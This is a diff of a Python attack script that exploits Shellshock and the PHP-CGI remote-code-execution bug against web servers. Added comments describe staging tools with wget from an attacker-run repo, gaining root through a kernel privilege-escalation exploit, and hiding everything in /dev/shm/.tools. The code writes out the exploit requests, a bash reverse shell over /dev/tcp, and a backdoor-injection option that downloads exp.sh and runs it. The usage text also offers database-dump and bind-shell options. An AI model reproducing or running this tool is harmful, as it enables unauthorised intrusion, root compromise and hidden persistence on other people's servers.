@@ -1,4 +1,13 @@
 #!/usr/bin/python
+# main exploiting script obtains code execution.
+#	With staging & Inject_backdoor; the first code wget's all the necessary scripts.
+# 		exp.sh obtains root w/ https://www.exploit-db.com/exploits/9545/
+#			Linux Kernel 2.4.x / 2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Privilege Escalation
+#		exp.sh turns into post.sh
+#			downloads all scripts and tools as root
+# 		Everything hides in /dev/shm/.tools
+#
+
 import socket, urlparse, re, os, sys, getopt, time
 
 os.environ['no_proxy'] = '127.0.0.1,localhost'
@@ -6,8 +15,9 @@ linkRegex = re.compile('<a\s*href=[\'|"](.*?)[\'"].*?.')
 CRLF = "\r\n\r\n"
 MEGA = 5000000
 
-TOOLREPO="192.168.1.XXX:8000"
-# python -m SimpleHTTPServer 8000
+# tool repo has all the scripts and file_$Last_3_IP
+# run with: python -m SimpleHTTPServer 5000
+TOOLREPO="192.168.1.XXX:5000"
 
 def MakeRequest(url, CUSTOM_HEADER):
     '''
@@ -37,6 +47,7 @@ def MakeRequest(url, CUSTOM_HEADER):
 
     data = (s.recv(MEGA))
 
+
     # this is the proper disconnect for a socket
     s.shutdown(1)
     s.close()
@@ -48,7 +59,6 @@ def ShellShockerRequest(shellshocker, host):
 	Apache mod_cgi - Remote Exploit (Shellshock)
 	https://www.exploit-db.com/exploits/34900/
 	'''
-
     header = "GET /~petition/cgi-bin/petition.py/ HTTP/1.1" 
     header += "\nUser-Agent: %s" % shellshocker
     header += "\nAccept-Encoding: gzip,deflate" 
@@ -64,7 +74,6 @@ def ApacheCGIRequest(payload, host):
 	Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution
 	https://www.exploit-db.com/exploits/29290/
 	'''
-	
     header = "POST /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 
     header += "\nUser-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
     header += "\nAccept-Encoding: gzip,deflate" 
@@ -103,7 +112,6 @@ def Shellshock(host,option,script,command,rport,rhost,lhost,lport,s_arg):
     '''
     make sure iptables is open for the port(s)
     all the options are sent all the time for lack of coding time
-	using the /dev/shm/ directory to run from
     '''
     SS = ""
     if host == '':
@@ -168,7 +176,6 @@ def Shellshock(host,option,script,command,rport,rhost,lhost,lport,s_arg):
         sys.exit(1)
 
     
-    # first create the port
     header = ShellShockerRequest(SS,host)
     data = MakeRequest(host,header)
     
@@ -178,19 +185,11 @@ def Shellshock(host,option,script,command,rport,rhost,lhost,lport,s_arg):
     print "[+] Received output"
     print data
 
-    # two calls at the same time does not work
-    # waiting doesn't work.....
-    #sleep(2)       # the socket needs a second
-    # open the port with IPtables
-    #SS = MakeShellShock("/sbin/iptables -A INPUT -p tcp -m tcp --dport " + str(rport) + " -j ACCEPT",False)
-    #header = MakeHeader(SS,host)
-    #GET(host,header)
 
 def ApacheCGI(host,option,script,command,rport,rhost,lhost,lport,s_arg):
     '''
     make sure iptables is open for the port(s)
     all the options are sent all the time for lack of coding time
-	using the /dev/shm/ directory to run from
     '''
     SS = ""
     if host == '':
@@ -217,8 +216,7 @@ def ApacheCGI(host,option,script,command,rport,rhost,lhost,lport,s_arg):
         SS = MakeApacheCGI("/bin/bash -c /bin/bash -i >& /dev/tcp/" + str(lhost) +"/"+str(lport)+" 0>&1 &")
 
     elif option == 'inject_backdoor':
-        SS = MakeApacheCGI("/usr/bin/wget -O /dev/shm/exp.sh http://" + TOOLREPO + "/exp.sh; \
-                            /bin/bash /dev/shm/exp.sh")
+        SS = MakeApacheCGI("/usr/bin/wget -O /dev/shm/exp.sh http://" + TOOLREPO + "/exp.sh; /bin/bash /dev/shm/exp.sh")
     elif option == 'get_script':
         if script == '':
             print "[!] error entering script name for get_script"
@@ -296,7 +294,7 @@ def usage():
     print "                             dump.sh post.sh         "
     print "             'custom'        +c                      "
     print "                 \--> *remember to include paths!    "
-	print "														"
+    print "                                                     "
     print "Method>  'AP':                                       "
     print "             'db_dump'                               "
     print "             'bind_shell'    +p                      "
